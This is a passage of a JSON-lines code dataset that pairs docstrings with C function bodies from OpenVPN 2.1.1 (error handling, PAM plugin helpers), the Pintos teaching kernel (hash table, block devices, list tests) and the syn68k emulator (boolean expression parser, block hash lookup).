break;\n\n\t    case PAM_ERROR_MSG:\n\t    case PAM_TEXT_INFO:\n\t      break;\n\n\t    default:\n\t      ret = PAM_CONV_ERR;\n\t      break;\n\t    }\n\t}\n    }\n\n  if (ret == PAM_SUCCESS)\n    *response_array = aresp;\n  return ret;\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Fail memory allocation.  Don't use msg() because it tries\n * to allocate memory as part of its operation.\n */\n", "func_signal": "void\nout_of_memory (void)", "code": "{\n  fprintf (stderr, PACKAGE_NAME \": Out of Memory\\n\");\n  exit (1);\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Daemonize if \"daemon\" env var is true.\n * Preserve stderr across daemonization if\n * \"daemon_log_redirect\" env var is true.\n */\n", "func_signal": "static void\ndaemonize (const char *envp[])", "code": "{\n  const char *daemon_string = get_env (\"daemon\", envp);\n  if (daemon_string && daemon_string[0] == '1')\n    {\n      const char *log_redirect = get_env (\"daemon_log_redirect\", envp);\n      int fd = -1;\n      if (log_redirect && log_redirect[0] == '1')\n\tfd = dup (2);\n      if (daemon (0, 0) < 0)\n\t{\n\t  fprintf (stderr, \"AUTH-PAM: daemonization failed\\n\");\n\t}\n      else if (fd >= 3)\n\t{\n\t  dup2 (fd, 2);\n\t  close (fd);\n\t}\n    }\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Apply muting filter.\n */\n", "func_signal": "bool\ndont_mute (unsigned int flags)", "code": "{\n  bool ret = true;\n  if (mute_cutoff > 0 && !(flags & M_NOMUTE))\n    {\n      const int mute_level = DECODE_MUTE_LEVEL (flags);\n      if (mute_level > 0 && mute_level == mute_category)\n\t{\n\t  if (mute_count == mute_cutoff)\n\t    msg (M_INFO | M_NOMUTE, \"NOTE: --mute triggered...\");\n\t  if (++mute_count > mute_cutoff)\n\t    ret = false;\n\t}\n      else\n\t{\n\t  const int suppressed = mute_count - mute_cutoff;\n\t  if (suppressed > 0)\n\t    msg (M_INFO | M_NOMUTE,\n\t\t \"%d variation(s) on previous %d message(s) suppressed by --mute\",\n\t\t suppressed,\n\t\t mute_cutoff);\n\t  mute_count = 1;\n\t  mute_category = mute_level;\n\t}\n    }\n  return ret;\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Translate msg flags into a string\n */\n", "func_signal": "const char *\nmsg_flags_string (const unsigned int flags, struct gc_arena *gc)", "code": "{\n  struct buffer out = alloc_buf_gc (16, gc);\n  if (flags == M_INFO)\n    buf_printf (&out, \"I\");\n  if (flags & M_FATAL)\n    buf_printf (&out, \"F\");\n  if (flags & M_NONFATAL)\n    buf_printf (&out, \"N\");\n  if (flags & M_WARN)\n    buf_printf (&out, \"W\");\n  if (flags & M_DEBUG)\n    buf_printf (&out, \"D\");\n  return BSTR (&out);\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Called after most socket or tun/tap operations, via the inline\n * function check_status().\n *\n * Decide if we should print an error message, and see if we can\n * extract any useful info from the error, such as a Path MTU hint\n * from the OS.\n */\n", "func_signal": "void\nx_check_status (int status,\n\t\tconst char *description,\n\t\tstruct link_socket *sock,\n\t\tstruct tuntap *tt)", "code": "{\n  const int my_errno = (sock ? openvpn_errno_socket () : (int)openvpn_errno ());\n  const char *extended_msg = NULL;\n\n  msg (x_cs_verbose_level, \"%s %s returned %d\",\n       sock ? proto2ascii (sock->info.proto, true) : \"\",\n       description,\n       status);\n\n  if (status < 0)\n    {\n      struct gc_arena gc = gc_new ();\n#if EXTENDED_SOCKET_ERROR_CAPABILITY\n      /* get extended socket error message and possible PMTU hint from OS */\n      if (sock)\n\t{\n\t  int mtu;\n\t  extended_msg = format_extended_socket_error (sock->sd, &mtu, &gc);\n\t  if (mtu > 0 && sock->mtu != mtu)\n\t    {\n\t      sock->mtu = mtu;\n\t      sock->info.mtu_changed = true;\n\t    }\n\t}\n#elif defined(WIN32)\n      /* get possible driver error from TAP-Win32 driver */\n      extended_msg = tap_win32_getinfo (tt, &gc);\n#endif\n      if (!ignore_sys_error (my_errno))\n\t{\n\t  if (extended_msg)\n\t    msg (x_cs_info_level, \"%s %s [%s]: %s (code=%d)\",\n\t\t description,\n\t\t sock ? proto2ascii (sock->info.proto, true) : \"\",\n\t\t extended_msg,\n\t\t strerror_ts (my_errno, &gc),\n\t\t my_errno);\n\t  else\n\t    msg (x_cs_info_level, \"%s %s: %s (code=%d)\",\n\t\t description,\n\t\t sock ? proto2ascii (sock->info.proto, true) : \"\",\n\t\t strerror_ts (my_errno, &gc),\n\t\t my_errno);\n\n\t  if (x_cs_err_delay_ms)\n\t    sleep_milliseconds (x_cs_err_delay_ms);\n\t}\n      gc_free (&gc);\n    }\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Socket read/write functions.\n */\n", "func_signal": "static int\nrecv_control (int fd)", "code": "{\n  unsigned char c;\n  const ssize_t size = read (fd, &c, sizeof (c));\n  if (size == sizeof (c))\n    return c;\n  else\n    {\n      /*fprintf (stderr, \"AUTH-PAM: DEBUG recv_control.read=%d\\n\", (int)size);*/\n      return -1;\n    }\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Return a file to print messages to before syslog is opened.\n */\n", "func_signal": "FILE *\nmsg_fp(const unsigned int flags)", "code": "{\n  FILE *fp = msgfp;\n  if (!fp)\n    fp = (flags & (M_FATAL|M_USAGE_SMALL)) ? default_err : default_out;\n  if (!fp)\n    openvpn_exit (OPENVPN_EXIT_STATUS_CANNOT_OPEN_DEBUG_FILE); /* exit point */\n  return fp;\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/* GLOBAL */\n", "func_signal": "void\nreset_check_status ()", "code": "{\n  x_cs_info_level = 0;\n  x_cs_verbose_level = 0;\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/* Returns true if value A is less than value B, false\n   otherwise. */\n", "func_signal": "static bool\nvalue_less (const struct list_elem *a_, const struct list_elem *b_,\n            void *aux UNUSED)", "code": "{\n  const struct value *a = list_entry (a_, struct value, elem);\n  const struct value *b = list_entry (b_, struct value, elem);\n  \n  return a->value < b->value;\n}", "path": "tests\\internal\\list.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Returns the block device fulfilling the given ROLE, or a null\n   pointer if no block device has been assigned that role. */\n", "func_signal": "struct block *\nblock_get_role (enum block_type role)", "code": "{\n  ASSERT (role < BLOCK_ROLE_CNT);\n  return block_by_role[role];\n}", "path": "devices\\block.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Returns the bucket in H that E belongs in. */\n", "func_signal": "static struct list *\nfind_bucket (struct hash *h, struct hash_elem *e)", "code": "{\n  size_t bucket_idx = h->hash (e, h->aux) & (h->bucket_cnt - 1);\n  return &h->buckets[bucket_idx];\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Prints statistics for each block device used for a Pintos role. */\n", "func_signal": "void\nblock_print_stats (void)", "code": "{\n  int i;\n\n  for (i = 0; i < BLOCK_CNT; i++)\n    {\n      struct block *block = block_by_role[i];\n      if (block != NULL)\n        {\n          printf (\"%s (%s): %llu reads, %llu writes\\n\",\n                  block->name, block_type_name (block->type),\n                  block->read_cnt, block->write_cnt);\n        }\n    }\n}", "path": "devices\\block.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Returns a hash of the SIZE bytes in BUF. */\n", "func_signal": "unsigned\nhash_bytes (const void *buf_, size_t size)", "code": "{\n  /* Fowler-Noll-Vo 32-bit hash, for bytes. */\n  const unsigned char *buf = buf_;\n  unsigned hash;\n\n  ASSERT (buf != NULL);\n\n  hash = FNV_32_BASIS;\n  while (size-- > 0)\n    hash = (hash * FNV_32_PRIME) ^ *buf++;\n\n  return hash;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Destroys hash table H.\n\n   If DESTRUCTOR is non-null, then it is first called for each\n   element in the hash.  DESTRUCTOR may, if appropriate,\n   deallocate the memory used by the hash element.  However,\n   modifying hash table H while hash_clear() is running, using\n   any of the functions hash_clear(), hash_destroy(),\n   hash_insert(), hash_replace(), or hash_delete(), yields\n   undefined behavior, whether done in DESTRUCTOR or\n   elsewhere. */\n", "func_signal": "void\nhash_destroy (struct hash *h, hash_action_func *destructor)", "code": "{\n  if (destructor != NULL)\n    hash_clear (h, destructor);\n  free (h->buckets);\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Inserts NEW into hash table H, replacing any equal element\n   already in the table, which is returned. */\n", "func_signal": "struct hash_elem *\nhash_replace (struct hash *h, struct hash_elem *new)", "code": "{\n  struct list *bucket = find_bucket (h, new);\n  struct hash_elem *old = find_elem (h, bucket, new);\n\n  if (old != NULL)\n    remove_elem (h, old);\n  insert_elem (h, bucket, new);\n\n  rehash (h);\n\n  return old;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Finds, removes, and returns an element equal to E in hash\n   table H.  Returns a null pointer if no equal element existed\n   in the table.\n\n   If the elements of the hash table are dynamically allocated,\n   or own resources that are, then it is the caller's\n   responsibility to deallocate them. */\n", "func_signal": "struct hash_elem *\nhash_delete (struct hash *h, struct hash_elem *e)", "code": "{\n  struct hash_elem *found = find_elem (h, find_bucket (h, e), e);\n  if (found != NULL) \n    {\n      remove_elem (h, found);\n      rehash (h); \n    }\n  return found;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Verifies that LIST contains the values 0...SIZE when traversed\n   in reverse order. */\n", "func_signal": "static void\nverify_list_bkwd (struct list *list, int size)", "code": "{\n  struct list_elem *e;\n  int i;\n\n  for (i = 0, e = list_rbegin (list);\n       i < size && e != list_rend (list);\n       i++, e = list_prev (e)) \n    {\n      struct value *v = list_entry (e, struct value, elem);\n      ASSERT (i == v->value);\n    }\n  ASSERT (i == size);\n  ASSERT (e == list_rend (list));\n}", "path": "tests\\internal\\list.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Shuffles the CNT elements in ARRAY into random order. */\n", "func_signal": "static void\nshuffle (struct value *array, size_t cnt)", "code": "{\n  size_t i;\n\n  for (i = 0; i < cnt; i++)\n    {\n      size_t j = i + random_ulong () % (cnt - i);\n      struct value t = array[j];\n      array[j] = array[i];\n      array[i] = t;\n    }\n}", "path": "tests\\internal\\list.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Returns a hash of string S. */\n", "func_signal": "unsigned\nhash_string (const char *s_)", "code": "{\n  const unsigned char *s = (const unsigned char *) s_;\n  unsigned hash;\n\n  ASSERT (s != NULL);\n\n  hash = FNV_32_BASIS;\n  while (*s != '\\0')\n    hash = (hash * FNV_32_PRIME) ^ *s++;\n\n  return hash;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Changes the number of buckets in hash table H to match the\n   ideal.  This function can fail because of an out-of-memory\n   condition, but that'll just make hash accesses less efficient;\n   we can still continue. */\n", "func_signal": "static void\nrehash (struct hash *h)", "code": "{\n  size_t old_bucket_cnt, new_bucket_cnt;\n  struct list *new_buckets, *old_buckets;\n  size_t i;\n\n  ASSERT (h != NULL);\n\n  /* Save old bucket info for later use. */\n  old_buckets = h->buckets;\n  old_bucket_cnt = h->bucket_cnt;\n\n  /* Calculate the number of buckets to use now.\n     We want one bucket for about every BEST_ELEMS_PER_BUCKET.\n     We must have at least four buckets, and the number of\n     buckets must be a power of 2. */\n  new_bucket_cnt = h->elem_cnt / BEST_ELEMS_PER_BUCKET;\n  if (new_bucket_cnt < 4)\n    new_bucket_cnt = 4;\n  while (!is_power_of_2 (new_bucket_cnt))\n    new_bucket_cnt = turn_off_least_1bit (new_bucket_cnt);\n\n  /* Don't do anything if the bucket count wouldn't change. */\n  if (new_bucket_cnt == old_bucket_cnt)\n    return;\n\n  /* Allocate new buckets and initialize them as empty. */\n  new_buckets = malloc (sizeof *new_buckets * new_bucket_cnt);\n  if (new_buckets == NULL) \n    {\n      /* Allocation failed.  This means that use of the hash table will\n         be less efficient.  However, it is still usable, so\n         there's no reason for it to be an error. */\n      return;\n    }\n  for (i = 0; i < new_bucket_cnt; i++) \n    list_init (&new_buckets[i]);\n\n  /* Install new bucket info. */\n  h->buckets = new_buckets;\n  h->bucket_cnt = new_bucket_cnt;\n\n  /* Move each old element into the appropriate new bucket. */\n  for (i = 0; i < old_bucket_cnt; i++) \n    {\n      struct list *old_bucket;\n      struct list_elem *elem, *next;\n\n      old_bucket = &old_buckets[i];\n      for (elem = list_begin (old_bucket);\n           elem != list_end (old_bucket); elem = next) \n        {\n          struct list *new_bucket\n            = find_bucket (h, list_elem_to_hash_elem (elem));\n          next = list_next (elem);\n          list_remove (elem);\n          list_push_front (new_bucket, elem);\n        }\n    }\n\n  free (old_buckets);\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Verifies that LIST contains the values 0...SIZE when traversed\n   in forward order. */\n", "func_signal": "static void\nverify_list_fwd (struct list *list, int size)", "code": "{\n  struct list_elem *e;\n  int i;\n  \n  for (i = 0, e = list_begin (list);\n       i < size && e != list_end (list);\n       i++, e = list_next (e)) \n    {\n      struct value *v = list_entry (e, struct value, elem);\n      ASSERT (i == v->value);\n    }\n  ASSERT (i == size);\n  ASSERT (e == list_end (list));\n}", "path": "tests\\internal\\list.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Verifies that SECTOR is a valid offset within BLOCK.\n   Panics if not. */\n", "func_signal": "static void\ncheck_sector (struct block *block, block_sector_t sector)", "code": "{\n  if (sector >= block->size)\n    {\n      /* We do not use ASSERT because we want to panic here\n         regardless of whether NDEBUG is defined. */\n      PANIC (\"Access past end of device %s (sector=%\"PRDSNu\", \"\n             \"size=%\"PRDSNu\")\\n\", block_name (block), sector, block->size);\n    }\n}", "path": "devices\\block.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Assigns BLOCK the given ROLE. */\n", "func_signal": "void\nblock_set_role (enum block_type role, struct block *block)", "code": "{\n  ASSERT (role < BLOCK_ROLE_CNT);\n  block_by_role[role] = block;\n}", "path": "devices\\block.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Inserts E into BUCKET (in hash table H). */\n", "func_signal": "static void\ninsert_elem (struct hash *h, struct list *bucket, struct hash_elem *e)", "code": "{\n  h->elem_cnt++;\n  list_push_front (bucket, &e->list_elem);\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Advances I to the next element in the hash table and returns\n   it.  Returns a null pointer if no elements are left.  Elements\n   are returned in arbitrary order.\n\n   Modifying a hash table H during iteration, using any of the\n   functions hash_clear(), hash_destroy(), hash_insert(),\n   hash_replace(), or hash_delete(), invalidates all\n   iterators. */\n", "func_signal": "struct hash_elem *\nhash_next (struct hash_iterator *i)", "code": "{\n  ASSERT (i != NULL);\n\n  i->elem = list_elem_to_hash_elem (list_next (&i->elem->list_elem));\n  while (i->elem == list_elem_to_hash_elem (list_end (i->bucket)))\n    {\n      if (++i->bucket >= i->hash->buckets + i->hash->bucket_cnt)\n        {\n          i->elem = NULL;\n          break;\n        }\n      i->elem = list_elem_to_hash_elem (list_begin (i->bucket));\n    }\n  \n  return i->elem;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Searches BUCKET in H for a hash element equal to E.  Returns\n   it if found or a null pointer otherwise. */\n", "func_signal": "static struct hash_elem *\nfind_elem (struct hash *h, struct list *bucket, struct hash_elem *e)", "code": "{\n  struct list_elem *i;\n\n  for (i = list_begin (bucket); i != list_end (bucket); i = list_next (i)) \n    {\n      struct hash_elem *hi = list_elem_to_hash_elem (i);\n      if (!h->less (hi, e, h->aux) && !h->less (e, hi, h->aux))\n        return hi; \n    }\n  return NULL;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Removes all the elements from H.\n   \n   If DESTRUCTOR is non-null, then it is called for each element\n   in the hash.  DESTRUCTOR may, if appropriate, deallocate the\n   memory used by the hash element.  However, modifying hash\n   table H while hash_clear() is running, using any of the\n   functions hash_clear(), hash_destroy(), hash_insert(),\n   hash_replace(), or hash_delete(), yields undefined behavior,\n   whether done in DESTRUCTOR or elsewhere. */\n", "func_signal": "void\nhash_clear (struct hash *h, hash_action_func *destructor)", "code": "{\n  size_t i;\n\n  for (i = 0; i < h->bucket_cnt; i++) \n    {\n      struct list *bucket = &h->buckets[i];\n\n      if (destructor != NULL) \n        while (!list_empty (bucket)) \n          {\n            struct list_elem *list_elem = list_pop_front (bucket);\n            struct hash_elem *hash_elem = list_elem_to_hash_elem (list_elem);\n            destructor (hash_elem, h->aux);\n          }\n\n      list_init (bucket); \n    }    \n\n  h->elem_cnt = 0;\n}", "path": "lib\\kernel\\hash.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* Reads sector SECTOR from BLOCK into BUFFER, which must\n   have room for BLOCK_SECTOR_SIZE bytes.\n   Internally synchronizes accesses to block devices, so external\n   per-block device locking is unneeded. */\n", "func_signal": "void\nblock_read (struct block *block, block_sector_t sector, void *buffer)", "code": "{\n  check_sector (block, sector);\n  block->ops->read (block->aux, sector, buffer);\n  block->read_cnt++;\n}", "path": "devices\\block.c", "repo_name": "maojie/pintos_mac", "stars": 33, "license": "other", "language": "c", "size": 511}
{"docstring": "/* <    Valid only for numerical expressions */\n", "func_signal": "static BoolExpr *\nBO_less_than (const List *ls)", "code": "{\n  if (ls->cdr == NULL || ls->cdr->cdr == NULL || CDDDR (ls) != NULL)\n    {\n      parse_error (ls, \"< takes two arguments.\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n  if (ls->cdr->token.type != TOK_NUMBER || CDDR (ls)->token.type != TOK_NUMBER)\n    {\n      parse_error (ls,\"< can only be used to compare numerical quantities!\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n\n  return (ls->cdr->token.u.n < CDDR (ls)->token.u.n)\n    ? &true_bool_expr : &false_bool_expr;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* not */\n", "func_signal": "static BoolExpr *\nBO_not (const List *ls)", "code": "{\n  BoolExpr *subexpr = make_boolean_expr (ls->cdr);\n\n  if (subexpr == NULL)\n    {\n      parse_error(ls, \"not takes an argument!\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n  if (subexpr->type == E_FALSE) return &true_bool_expr;\n  if (subexpr->type == E_TRUE ) return &false_bool_expr;\n  return create_bool_expr (E_NOT, subexpr);\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Similar to hash_lookup(), but this returns a pointer to the compiled\n * code associated with a given 68k address instead of to the block associated\n * with that code.  If no compiled code exists for that block, code is\n * compiled for that block and a pointer to the new code is returned.  This\n * function is guaranteed to return a non-NULL pointer to valid code.\n */\n", "func_signal": "const uint16 *\nhash_lookup_code_and_create_if_needed (syn68k_addr_t addr)", "code": "{\n  Block *b, *bucket, **bucket_ptr;\n  int old_sigmask;\n\n  bucket_ptr = &block_hash_table[BLOCK_HASH (addr)];\n  bucket = *bucket_ptr;\n\n  /* If there's anything in this bucket, check for a match. */\n  if (bucket != NULL)\n    {\n      Block *prev, *next;\n\n      /* See if we get a match in the first element. */\n      if (bucket->m68k_start_address == addr)\n\treturn bucket->compiled_code;\n\n      /* See if we get a match in a later element.  If we do, move it\n       * to the head of the list, since it is likely to be referenced\n       * again.\n       */\n      for (prev = bucket; (next = prev->next_in_hash_bucket) != NULL;\n\t   prev = next)\n\t{\n\t  if (next->m68k_start_address == addr)\n\t    {\n\t      BLOCK_INTERRUPTS (old_sigmask);\n\t      prev->next_in_hash_bucket = next->next_in_hash_bucket;\n\t      next->next_in_hash_bucket = bucket;\n\t      *bucket_ptr = next;\n\t      RESTORE_INTERRUPTS (old_sigmask);\n\t      return next->compiled_code;\n\t    }\n\t}\n    }\n\n  BLOCK_INTERRUPTS (old_sigmask);\n  generate_block (NULL, addr, &b, FALSE);\n  RESTORE_INTERRUPTS (old_sigmask);\n\n  /* Call the user-defined function to let them know we're done. */\n  if (call_while_busy_func != NULL)\n    call_while_busy_func (0);\n\n  return b->compiled_code;\n}", "path": "runtime\\hash.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* or */\n", "func_signal": "static BoolExpr *\nBO_or (const List *ls)", "code": "{\n  BOOL hit_false = FALSE;\n  BoolExpr *subexpr, *ret;\n\n  ret = create_bool_expr (E_OR, NULL);\n  while ((ls = ls->cdr))\n    {\n      subexpr = make_boolean_expr (ls);\n      if (subexpr->type == E_TRUE)\n\treturn &true_bool_expr;\n      if (subexpr->type == E_FALSE)  /* No sense adding in FALSE statements*/\n\thit_false = TRUE;\n      else\n\t{\n\t  subexpr->next = ret->subexpr;\n\t  ret->subexpr = subexpr;\n\t}\n    }\n  if (ret->subexpr == NULL)\n    {\n      if (hit_false)   /* If we hit nothing but FALSE's return FALSE */\n\treturn &false_bool_expr;\n      parse_error(ls, \"or takes arguments!\\n\");\n      return &false_bool_expr;   /* Default = FALSE */\n    }\n  \n  if (ret->subexpr->next == NULL) /* (or a) == a */\n    return ret->subexpr;\n  \n  return ret;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Prints out the list in reverse order. */\n", "func_signal": "static void\noutput_desc_list (FILE *table_fp, FILE *header_fp,\n\t\t  guest_code_descriptor_t *g)", "code": "{\n  if (g == NULL)\n    return;\n\n  /* Filter out two adjacent desc's that are equal except for the\n   * cc bits they claim to compute.  If we hit this situation, we might\n   * as well only bother with the guy who claims to compute the most\n   * cc bits.\n   */\n  if (!g->static_p && g->next != NULL && g->next->static_p\n      && (g->cc_out & g->next->cc_out) == g->cc_out)\n    {\n      int equal_p;\n      unsigned save_cc_out;\n\n      /* See if the two are essentially identical. */\n      save_cc_out = g->cc_out;\n      g->cc_out = g->next->cc_out;\n      equal_p = gcd_equal_p (g, g->next);\n      g->cc_out = save_cc_out;\n\n      if (equal_p)\n\t{\n\t  g->next->name = g->name;\n\t  g->next->static_p = FALSE;\n\t  output_desc_list (table_fp, header_fp, g->next);\n\t  return;\n\t}\n    }\n\n  output_desc_list (table_fp, header_fp, g->next);\n  output_desc (table_fp, header_fp, g);\n}", "path": "runtime\\native\\i386\\xlatemain.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* >=    Valid only for numerical expressions */\n", "func_signal": "static BoolExpr *\nBO_gr_or_equal (const List *ls)", "code": "{\n  if (ls->cdr == NULL || ls->cdr->cdr == NULL || CDDDR (ls) != NULL)\n    {\n      parse_error (ls, \">= takes two arguments.\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n  if (ls->cdr->token.type != TOK_NUMBER || CDDR (ls)->token.type != TOK_NUMBER)\n    {\n      parse_error (ls,\n\t\t   \">= can only be used to compare numerical quantities!\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n\n  return (ls->cdr->token.u.n >= CDDR (ls)->token.u.n)\n    ? &true_bool_expr : &false_bool_expr;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Given a boolean expression and (un)known ifull and ofull conditions, this\n * function returns E_FALSE, E_TRUE or E_UNKNOWN reflecting the truth or\n * falsity of the boolean expression.\n */\n", "func_signal": "BoolExprType\neval_bool_expr (const BoolExpr *be)", "code": "{\n  BoolExprType deflt;\n\n  switch (be->type) {\n  case E_TRUE:  return E_TRUE;\n  case E_FALSE: return E_FALSE;\n  case E_NOT:\n    switch (eval_bool_expr (be->subexpr)) {\n    case E_TRUE:  return E_FALSE;\n    case E_FALSE: return E_TRUE;\n    default:      return E_UNKNOWN;\n    }\n  case E_AND:\n    deflt = E_TRUE;\n    for (be=be->subexpr; be != NULL; be=be->next)\n      switch (eval_bool_expr (be)) {\n      case E_FALSE:   return E_FALSE;\n      case E_UNKNOWN: deflt = E_UNKNOWN; break;   /* Could still be E_FALSE */\n      default: break;\n      }\n    return deflt;\n  case E_OR:\n    deflt = E_FALSE;\n    for (be=be->subexpr; be != NULL; be=be->next)\n      switch (eval_bool_expr (be)) {\n      case E_TRUE:    return E_TRUE;\n      case E_UNKNOWN: deflt = E_UNKNOWN; break;   /* Could still be E_TRUE */\n      default: break;\n      }\n    return deflt;\n  default: return E_UNKNOWN;\n  }\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* <=   Valid only for numerical expressions */\n", "func_signal": "static BoolExpr *\nBO_less_or_equal (const List *ls)", "code": "{\n  if (ls->cdr == NULL || CDDR (ls) == NULL || CDDDR (ls) != NULL)\n    {\n      parse_error (ls, \"<= takes two arguments.\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n  if (ls->cdr->token.type != TOK_NUMBER || CDDR (ls)->token.type != TOK_NUMBER)\n    {\n      parse_error (ls,\n\t\t   \"<= can only be used to compare numerical quantities!\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n\n  return (ls->cdr->token.u.n <= CDDR (ls)->token.u.n)\n    ? &true_bool_expr : &false_bool_expr;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* =      This can either compare two numerical expressions or two strings */\n", "func_signal": "static BoolExpr *\nBO_equal (const List *ls)", "code": "{\n  if (ls->cdr == NULL || CDDR (ls) == NULL || CDDDR (ls) != NULL)\n    {\n      parse_error (ls, \"= takes two arguments.\\n\");\n      return &false_bool_expr;   /* default = FALSE */\n    }\n\n  return tokens_equal (&ls->cdr->token, &(CDDR (ls))->token)\n    ? &true_bool_expr : &false_bool_expr;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* Removes a given block from the hash table.  If it's not in the hash\n * table, no action is taken.\n */\n", "func_signal": "void\nhash_remove (Block *b)", "code": "{\n  Block **bucket = &block_hash_table[BLOCK_HASH (b->m68k_start_address)];\n  \n  for (; *bucket != NULL; bucket = &(*bucket)->next_in_hash_bucket)\n    if (*bucket == b)\n      {\n\t*bucket = b->next_in_hash_bucket;\n\tbreak;\n      }\n}", "path": "runtime\\hash.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
{"docstring": "/* <>    This can either compare two numerical expressions or two strings */\n", "func_signal": "static BoolExpr *\nBO_not_equal(const List *ls)", "code": "{\n  if (ls->cdr == NULL || ls->cdr->cdr == NULL || CDDDR (ls) != NULL)\n    {\n      parse_error (ls, \"<> takes two arguments.\\n\");\n      return &false_bool_expr;  /* default = FALSE */\n    }\n\n  return !tokens_equal (&ls->cdr->token, &(CDDR (ls))->token)\n    ? &true_bool_expr : &false_bool_expr;\n}", "path": "syngen\\boolean.c", "repo_name": "ctm/syn68k", "stars": 61, "license": "other", "language": "c", "size": 676}
